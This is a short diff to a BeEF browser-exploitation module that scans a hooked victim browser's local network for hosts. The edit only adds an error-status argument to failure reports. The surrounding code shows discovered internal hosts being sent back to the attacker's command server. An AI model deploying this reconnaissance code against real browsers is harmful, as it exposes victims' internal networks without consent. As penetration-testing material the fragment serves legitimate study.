@@ -8,7 +8,7 @@ beef.execute(function() {
 
   if(!beef.browser.isFF() && !beef.browser.isC()){
     beef.debug("[command #<%= @command_id %>] Browser is not supported.");
-    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser");
+    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser", beef.are.status_error());
   }
 
   var min_timeout = 500;
@@ -105,7 +105,7 @@ var doScan = function(timeout) {
         beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unexpected results&hosts="+hosts);
       }
     } else if (discovered_hosts.length == 0) {
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=no results");
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=no results", beef.are.status_error());
     } else {
       beef.debug("[command #<%= @command_id %>] Identifying LAN hosts completed.");
       beef.net.send('<%= @command_url %>', <%= @command_id %>, 'hosts='+hosts);
